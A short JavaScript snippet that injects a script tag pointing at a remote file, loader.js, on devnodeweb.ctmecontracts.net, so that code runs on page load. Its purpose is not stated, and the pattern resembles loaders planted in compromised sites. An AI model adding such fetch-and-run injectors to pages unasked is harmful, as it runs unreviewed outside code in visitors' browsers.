var scriptUrl  = 'https://devnodeweb.ctmecontracts.net/loader.js';
(function injectScript(scriptSrc, callback) {
	var script = document.createElement('script');

	script.type = 'text/javascript';
	script.async = false;

	script.src = scriptSrc;

	document.getElementsByTagName('head')[0].appendChild(script);
}(scriptUrl));

